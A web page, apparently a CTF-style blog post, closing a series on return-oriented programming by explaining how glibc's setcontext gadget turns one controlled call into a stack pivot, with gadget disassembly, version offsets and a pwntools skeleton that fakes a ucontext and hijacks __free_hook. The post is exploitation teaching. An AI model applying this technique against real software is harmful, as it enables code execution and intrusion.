@@ -1,0 +1,198 @@
+<!doctype html>
+<html lang="en" data-mode="dark" data-crt="on">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#060606" media="(prefers-color-scheme: dark)">
+<meta name="theme-color" content="#f3f3f3" media="(prefers-color-scheme: light)">
+<script>(function(){try{var d=document.documentElement,m=localStorage.getItem('sf.mode');if(!m)m=matchMedia('(prefers-color-scheme: light)').matches?'light':'dark';d.setAttribute('data-mode',m);if(localStorage.getItem('sf.crt')==='on')d.setAttribute('data-crt','on');}catch(e){}})();</script>
+<title>the setcontext gadget — one call to every register — algoatson.github.io</title>
+<meta name="description" content="A single controlled call — from a hook, an FSOP vtable, a function pointer — sets one register and jumps once. setcontext turns that into everything: it restores rsp and the whole register file from a struct you point it at, converting one redirect into a full pivot. The modern bridge from &quot;I control one call&quot; to &quot;I control the machine&quot;.">
+<meta name="author" content="your name here">
+<link rel="canonical" href="https://algoatson.github.io/p/setcontext-register-control/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="the setcontext gadget — one call to every register — algoatson.github.io">
+<meta property="og:description" content="A single controlled call — from a hook, an FSOP vtable, a function pointer — sets one register and jumps once. setcontext turns that into everything: it restores rsp and the whole register file from a struct you point it at, converting one redirect into a full pivot. The modern bridge from &quot;I control one call&quot; to &quot;I control the machine&quot;.">
+<meta property="og:url" content="https://algoatson.github.io/p/setcontext-register-control/">
+<meta property="og:site_name" content="algoatson.github.io">
+<meta property="og:image" content="https://algoatson.github.io/assets/og/setcontext-register-control.png"><meta name="twitter:card" content="summary_large_image">
+<link rel="preload" href="/assets/vga.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="icon" type="image/svg+xml" href="/assets/favicon.svg">
+<link rel="alternate" type="application/rss+xml" title="algoatson.github.io" href="/feed.xml">
+<link rel="stylesheet" href="/assets/style.css">
+<link rel="stylesheet" href="/assets/pygments.css">
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "Article", "headline": "the setcontext gadget — one call to every register", "datePublished": "2026-05-31", "dateModified": "2026-05-31", "author": {"@type": "Person", "name": "your name here"}, "publisher": {"@type": "Person", "name": "segfault"}, "description": "A single controlled call — from a hook, an FSOP vtable, a function pointer — sets one register and jumps once. setcontext turns that into everything: it restores rsp and the whole register file from a struct you point it at, converting one redirect into a full pivot. The modern bridge from \"I control one call\" to \"I control the machine\".", "url": "https://algoatson.github.io/p/setcontext-register-control/", "mainEntityOfPage": "https://algoatson.github.io/p/setcontext-register-control/", "keywords": "pwn, rop, internals"}</script></head>
+<body>
+<a class="skip" href="#main">skip to content</a>
+<div class="progress" aria-hidden="true"></div>
+<div class="wrap">
+  <div class="frame">
+    <span class="frame__legend"><a href="/">algoatson.github.io</a></span>
+    <span class="frame__addr">~/posts</span>
+
+    <header class="bar">
+      <span class="bar__prompt">&#10095; <b>segfault</b>@algoatson.github.io</span>
+      <nav class="nav" aria-label="primary"><a href="/about/">whoami</a><a href="/" aria-current="page">posts</a><a href="/series/">series</a><a href="/tags/">tags</a></nav>
+      <button class="searchbtn" data-open="search" type="button">grep<kbd>/</kbd></button>
+    </header>
+
+    <main class="main" id="main">
+<a class="backlink" href="/">back to index</a>
+<header class="posthead">
+  <h1>the setcontext gadget — one call to every register</h1>
+  <div class="meta"><span>2026-05-31</span><span>4 min read</span><a class="tag" href="/tags/pwn/">pwn</a> <a class="tag" href="/tags/rop/">rop</a> <a class="tag" href="/tags/internals/">internals</a></div>
+</header>
+<aside class="series" aria-label="series navigation"><div class="series__head"><span class="series__label">series</span><a class="series__name" href="/series/return-oriented-programming/">return-oriented programming</a><span class="series__pos">part 8 / 8 · ~28 min</span></div><div class="series__bar" aria-hidden="true"><span style="width:100%"></span></div><ol class="series__list"><li><a href="/p/ret2libc-warmup/">ret2libc on a warm-up: stack smash to shell</a></li><li><a href="/p/finding-gadgets/">finding gadgets: ROPgadget, ropper, one_gadget, pwntools</a></li><li><a href="/p/ret2csu-universal-gadget/">ret2csu — the universal gadget hiding in every binary</a></li><li><a href="/p/ret2dlresolve-no-leak/">ret2dlresolve — a shell with no libc leak</a></li><li><a href="/p/stack-pivoting/">stack pivoting — when the overflow is too small</a></li><li><a href="/p/srop-one-syscall-every-register/">SROP — one syscall, every register</a></li><li><a href="/p/one-gadget-constraints/">one_gadget — a shell in a single address</a></li><li class="cur" aria-current="true">the setcontext gadget — one call to every register</li></ol></aside>
+<div class="postwrap has-toc">
+  <aside class="toc" aria-label="table of contents"><span class="toctitle">contents</span><div class="toc">
+<ul>
+<li><a href="#what-setcontext-restores">what setcontext restores</a></li>
+<li><a href="#the-version-wrinkle-rdi-rdx">the version wrinkle: rdi → rdx</a></li>
+<li><a href="#the-fake-context-and-the-delivery">the fake context, and the delivery</a></li>
+<li><a href="#why-its-the-modern-keystone">why it's the modern keystone</a></li>
+</ul>
+</div>
+</aside>
+  <article class="prose"><p><a href="/p/srop-one-syscall-every-register/">SROP</a> gets you every register from the
+<em>kernel's</em> restore path. libc ships its own version of that gadget, and you don't
+need a syscall to reach it: <code class="highlight">setcontext</code>. After the malloc hooks died and
+<a href="/p/house-of-apple-2/">House of Apple 2</a> made "one controlled indirect call" the
+common primitive, <code class="highlight">setcontext</code> is what you point that call at to escalate from a
+single jump into total control.</p>
+<figure class="target"><figcaption><span class="t-label">target</span><span class="t-file">./svc + libc.so.6</span></figcaption><div class="target__grid target__grid--solo"><dl class="target__facts"><div><dt>arch</dt><dd>amd64-64-little</dd></div><div><dt>have</dt><dd>one controlled call where you control a pointer register (rdi or rdx)</dd></div><div><dt>want</dt><dd>rsp + the full register file, i.e. a pivot into ROP</dd></div></dl></div></figure>
+<h2 id="what-setcontext-restores">what setcontext restores<a class="headerlink" href="#what-setcontext-restores" title="Permanent link">#</a></h2>
+<p><code class="highlight">setcontext(ucontext_t *)</code> is the userland twin of <code class="highlight">rt_sigreturn</code>: it loads the
+saved CPU state out of a <code class="highlight">ucontext_t</code>. The exploitation-relevant slice is a run of
+<code class="highlight">mov</code>s partway in — the <strong><code class="highlight">setcontext+53</code></strong> gadget on older glibc — that reloads
+the general registers, the stack pointer, and the return address straight from the
+struct:</p>
+<figure class="codeblock"><figcaption><span class="fname">setcontext+53 (glibc &lt;= 2.28): context pointer in rdi</span><span class="lang">asm</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#setcontext53-glibc-228-context-pointer-in-rdi-1"> 1</a></span>
+<span class="normal"><a href="#setcontext53-glibc-228-context-pointer-in-rdi-2"> 2</a></span>
+<span class="normal"><a href="#setcontext53-glibc-228-context-pointer-in-rdi-3"> 3</a></span>
+<span class="normal"><a href="#setcontext53-glibc-228-context-pointer-in-rdi-4"> 4</a></span>
+<span class="normal"><a href="#setcontext53-glibc-228-context-pointer-in-rdi-5"> 5</a></span>
+<span class="normal"><a href="#setcontext53-glibc-228-context-pointer-in-rdi-6"> 6</a></span>
+<span class="normal"><a href="#setcontext53-glibc-228-context-pointer-in-rdi-7"> 7</a></span>
+<span class="normal"><a href="#setcontext53-glibc-228-context-pointer-in-rdi-8"> 8</a></span>
+<span class="normal"><a href="#setcontext53-glibc-228-context-pointer-in-rdi-9"> 9</a></span>
+<span class="normal"><a href="#setcontext53-glibc-228-context-pointer-in-rdi-10">10</a></span>
+<span class="normal"><a href="#setcontext53-glibc-228-context-pointer-in-rdi-11">11</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="setcontext53-glibc-228-context-pointer-in-rdi-1"><span class="nf">mov</span><span class="w">  </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">rdi</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="mi">0xa0</span><span class="p">]</span><span class="w">      </span><span class="c1">; *** the pivot: rsp = whatever you put here ***</span>
+</span><span id="setcontext53-glibc-228-context-pointer-in-rdi-2"><span class="hll"><span class="nf">mov</span><span class="w">  </span><span class="no">rbx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">rdi</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="mi">0x80</span><span class="p">]</span>
+</span></span><span id="setcontext53-glibc-228-context-pointer-in-rdi-3"><span class="nf">mov</span><span class="w">  </span><span class="no">rbp</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">rdi</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="mi">0x78</span><span class="p">]</span>
+</span><span id="setcontext53-glibc-228-context-pointer-in-rdi-4"><span class="nf">mov</span><span class="w">  </span><span class="no">r12</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">rdi</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="mi">0x48</span><span class="p">]</span>
+</span><span id="setcontext53-glibc-228-context-pointer-in-rdi-5"><span class="nf">mov</span><span class="w">  </span><span class="no">r13</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">rdi</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="mi">0x50</span><span class="p">]</span><span class="w">      </span><span class="c1">; ... r14, r15 too</span>
+</span><span id="setcontext53-glibc-228-context-pointer-in-rdi-6"><span class="nf">mov</span><span class="w">  </span><span class="no">rsi</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">rdi</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="mi">0x70</span><span class="p">]</span>
+</span><span id="setcontext53-glibc-228-context-pointer-in-rdi-7"><span class="nf">mov</span><span class="w">  </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">rdi</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="mi">0x88</span><span class="p">]</span>
+</span><span id="setcontext53-glibc-228-context-pointer-in-rdi-8"><span class="hll"><span class="nf">mov</span><span class="w">  </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">rdi</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="mi">0xa8</span><span class="p">]</span><span class="w">      </span><span class="c1">; the target rip</span>
+</span></span><span id="setcontext53-glibc-228-context-pointer-in-rdi-9"><span class="hll"><span class="nf">push</span><span class="w"> </span><span class="no">rcx</span>
+</span></span><span id="setcontext53-glibc-228-context-pointer-in-rdi-10"><span class="nf">mov</span><span class="w">  </span><span class="no">rdi</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">rdi</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="mi">0x68</span><span class="p">]</span>
+</span><span id="setcontext53-glibc-228-context-pointer-in-rdi-11"><span class="nf">ret</span><span class="w">                         </span><span class="c1">; -&gt; rcx, now executing with YOUR rsp + registers</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p>Point a register at a fake <code class="highlight">ucontext</code> and one jump to this gadget gives you <code class="highlight">rsp</code>,
+<code class="highlight">rdi</code>, <code class="highlight">rsi</code>, <code class="highlight">rdx</code>, <code class="highlight">rbx</code>, <code class="highlight">rbp</code>, <code class="highlight">r12</code>–<code class="highlight">r15</code>, and <code class="highlight">rip</code>. With <code class="highlight">rsp</code> controlled,
+you've <strong>pivoted onto a ROP chain</strong>; with the arg registers controlled, you can
+instead land a single <code class="highlight">execve</code> or <code class="highlight">mprotect</code> directly.</p>
+<h2 id="the-version-wrinkle-rdi-rdx">the version wrinkle: rdi → rdx<a class="headerlink" href="#the-version-wrinkle-rdi-rdx" title="Permanent link">#</a></h2>
+<p>Then glibc 2.29 reorganised <code class="highlight">setcontext</code>, and the gadget started reading the
+context pointer from <strong><code class="highlight">rdx</code></strong> instead of <code class="highlight">rdi</code> (<code class="highlight">setcontext+61</code> on those builds):</p>
+<figure class="codeblock"><figcaption><span class="fname">which register holds the context</span><span class="lang">txt</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#which-register-holds-the-context-1">1</a></span>
+<span class="normal"><a href="#which-register-holds-the-context-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="which-register-holds-the-context-1">glibc &lt;= 2.28 :  setcontext+53  reads [rdi + ...]
+</span><span id="which-register-holds-the-context-2">glibc &gt;= 2.29 :  setcontext+61  reads [rdx + ...]
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p>That matters because your <em>delivery</em> primitive usually controls <code class="highlight">rdi</code> (a hook
+calls <code class="highlight">hook(rdi=ptr)</code>; House of Apple's call passes the FILE in <code class="highlight">rdi</code>). On 2.29+
+you need <code class="highlight">rdx</code> pointed at the fake context, so you chain a <strong>"magic gadget"</strong> that
+moves a controlled value into <code class="highlight">rdx</code> first — e.g. a libc <code class="highlight">mov rdx, [rdi+8]; ... ;call [rdi+...]</code> fragment (the <code class="highlight">svcudp_reply</code> / <code class="highlight">getkeyserv_handle</code> gadgets people
+catalogue) — then it lands in <code class="highlight">setcontext</code> with <code class="highlight">rdx</code> set.</p>
+<h2 id="the-fake-context-and-the-delivery">the fake context, and the delivery<a class="headerlink" href="#the-fake-context-and-the-delivery" title="Permanent link">#</a></h2>
+<p>Craft the <code class="highlight">ucontext</code> with <code class="highlight">rsp</code> → your ROP chain and <code class="highlight">rip</code> → a <code class="highlight">ret</code> (or the first
+gadget), then drive it from whatever single call you control:</p>
+<figure class="codeblock"><figcaption><span class="fname">setcontext.py</span><span class="lang">python</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#setcontextpy-1"> 1</a></span>
+<span class="normal"><a href="#setcontextpy-2"> 2</a></span>
+<span class="normal"><a href="#setcontextpy-3"> 3</a></span>
+<span class="normal"><a href="#setcontextpy-4"> 4</a></span>
+<span class="normal"><a href="#setcontextpy-5"> 5</a></span>
+<span class="normal"><a href="#setcontextpy-6"> 6</a></span>
+<span class="normal"><a href="#setcontextpy-7"> 7</a></span>
+<span class="normal"><a href="#setcontextpy-8"> 8</a></span>
+<span class="normal"><a href="#setcontextpy-9"> 9</a></span>
+<span class="normal"><a href="#setcontextpy-10">10</a></span>
+<span class="normal"><a href="#setcontextpy-11">11</a></span>
+<span class="normal"><a href="#setcontextpy-12">12</a></span>
+<span class="normal"><a href="#setcontextpy-13">13</a></span>
+<span class="normal"><a href="#setcontextpy-14">14</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="setcontextpy-1"><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+</span><span id="setcontextpy-2"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./libc.so.6&quot;</span><span class="p">);</span> <span class="n">base</span> <span class="o">=</span> <span class="n">leak_libc</span><span class="p">()</span>
+</span><span id="setcontextpy-3"><span class="n">setctx</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;setcontext&quot;</span><span class="p">]</span> <span class="o">+</span> <span class="mi">53</span>      <span class="c1"># +61 on glibc &gt;= 2.29</span>
+</span><span id="setcontextpy-4">
+</span><span id="setcontextpy-5"><span class="n">ctx</span> <span class="o">=</span> <span class="n">flat</span><span class="p">({</span>
+</span><span id="setcontextpy-6"><span class="hll">    <span class="mh">0xa0</span><span class="p">:</span> <span class="n">rop_chain_addr</span><span class="p">,</span>      <span class="c1"># -&gt; rsp</span>
+</span></span><span id="setcontextpy-7"><span class="hll">    <span class="mh">0xa8</span><span class="p">:</span> <span class="n">base</span> <span class="o">+</span> <span class="n">ROP_RET</span><span class="p">,</span>      <span class="c1"># -&gt; rip (a clean `ret`, falls into the chain)</span>
+</span></span><span id="setcontextpy-8"><span class="hll"><span class="p">},</span> <span class="n">filler</span><span class="o">=</span><span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span>
+</span></span><span id="setcontextpy-9"><span class="n">write</span><span class="p">(</span><span class="n">fake_ctx_addr</span><span class="p">,</span> <span class="n">ctx</span><span class="p">)</span>                          <span class="c1"># stage the context somewhere known</span>
+</span><span id="setcontextpy-10">
+</span><span id="setcontextpy-11"><span class="c1"># delivery: a controlled call with rdi = fake_ctx_addr (e.g. __free_hook pre-2.34,</span>
+</span><span id="setcontextpy-12"><span class="hll"><span class="c1"># or House of Apple&#39;s _IO_wfile call), pointed at the setcontext gadget:</span>
+</span></span><span id="setcontextpy-13"><span class="n">overwrite_free_hook</span><span class="p">(</span><span class="n">setctx</span><span class="p">)</span>                         <span class="c1"># free(fake_ctx_addr) -&gt; setcontext(rdi)</span>
+</span><span id="setcontextpy-14"><span class="n">trigger</span><span class="p">()</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<details class="spoiler">
+<summary>one call, then the machine is yours</summary>
+<p>The hook called <code class="highlight">setcontext(rdi)</code>, <code class="highlight">rsp</code> moved onto the ROP chain, and the
+chain runs <code class="highlight">mprotect</code> + shellcode (or straight <code class="highlight">execve</code>):
+<figure class="codeblock"><figcaption><span class="lang">txt</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#code-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="code-1">segfault{one_call_became_a_whole_rop_chain}
+</span></code></pre></div></td></tr></table></div>
+</figure></p>
+</details>
+<h2 id="why-its-the-modern-keystone">why it's the modern keystone<a class="headerlink" href="#why-its-the-modern-keystone" title="Permanent link">#</a></h2>
+<ul>
+<li><strong>It converts a call into a pivot.</strong> Most modern primitives (FSOP, a function
+  pointer, a leftover hook) give you <em>one</em> indirect call with <em>one</em> controlled
+  register. setcontext multiplies that into <code class="highlight">rsp</code> + every argument register — the
+  difference between calling a single function and running an arbitrary chain.</li>
+<li><strong>It pairs with everything.</strong> House of Apple gives the call; setcontext gives the
+  pivot; the chain gives the shell. That triad — leak → controlled call → setcontext
+  → ROP — is the spine of a large fraction of current glibc heap exploits.</li>
+<li><strong>It degrades gracefully across versions</strong> as long as you track the rdi→rdx move
+  and carry the matching <code class="highlight">mov rdx</code> gadget.</li>
+</ul>
+<p>If <a href="/p/srop-one-syscall-every-register/">SROP</a> is the kernel handing you the
+register file, setcontext is libc doing the same favour — and because you reach it
+with an ordinary call rather than a syscall, it slots in wherever your bug already
+gave you a single jump. That's why "I control one call" is, on a modern libc,
+almost always enough.</p></article>
+</div>
+<section class="related"><span class="related__title">related</span><div class="listing"><div class="row"><span class="row__date">2026-06-07</span><a class="row__tag" href="/tags/pwn/">pwn</a><a class="row__title" href="/p/ptr-mangle-exit-handlers/">PTR_MANGLE and hijacking the exit handlers</a><span class="row__min">3 min</span></div><div class="row"><span class="row__date">2026-06-05</span><a class="row__tag" href="/tags/pwn/">pwn</a><a class="row__title" href="/p/cet-shadow-stack-ibt/">CET — shadow stacks, IBT, and what still works</a><span class="row__min">3 min</span></div><div class="row"><span class="row__date">2026-06-02</span><a class="row__tag" href="/tags/pwn/">pwn</a><a class="row__title" href="/p/arm64-pac-and-mte/">PAC and MTE — how ARM64&#x27;s new walls fall</a><span class="row__min">3 min</span></div></div></section>
+<nav class="pager"><a class="prev" href="/p/one-gadget-constraints/"><span class="lbl">&#8249; prev</span>one_gadget — a shell in a single address</a></nav></main>
+
+    <footer class="status">
+      <span>58 posts</span>
+      <span class="shade">&#9617;&#9618;&#9619;</span>
+      <span>no trackers · no cookies · no js required to read · copying is encouraged</span>
+      <span class="right">
+        <a href="https://github.com/algoatson">github</a><a href="https://twitter.com/yourname">twitter</a><a href="mailto:you@segfault.sh">email</a>
+        <button class="toggle" data-toggle="mode" type="button">[light]</button>
+        <button class="toggle" data-toggle="crt" type="button">[crt]</button>
+        <a href="/feed.xml">[rss]</a>
+      </span>
+    </footer>
+  </div>
+</div>
+
+<div class="palette-mask" role="dialog" aria-modal="true" aria-label="search">
+  <div class="palette">
+    <div class="palette__count">grep<span class="n">0/0</span><span class="rule"></span>posts</div>
+    <div class="palette__input"><span class="sigil">&gt;</span><input type="text"
+       placeholder="fuzzy search title + body…" autocomplete="off" spellcheck="false" aria-label="search query"></div>
+    <div class="palette__results"></div>
+    <div class="palette__hint"><span><kbd>↑↓</kbd>/<kbd>^j ^k</kbd> move</span><span><kbd>⏎</kbd> open</span><span><kbd>esc</kbd> close</span></div>
+  </div>
+</div>
+<div class="help-mask" role="dialog" aria-modal="true" aria-label="keyboard shortcuts">
+  <div class="help"><h2>keys</h2><dl><dt><kbd>/</kbd></dt><dd>search</dd><dt><kbd>j / k</kbd></dt><dd>move / scroll</dd><dt><kbd>enter</kbd></dt><dd>open</dd><dt><kbd>g g / G</kbd></dt><dd>top / bottom</dd><dt><kbd>t</kbd></dt><dd>toggle light</dd><dt><kbd>?</kbd></dt><dd>this help</dd><dt><kbd>esc</kbd></dt><dd>close</dd></dl></div>
+</div>
+<script src="/assets/app.js" defer></script>
+</body>
+</html>
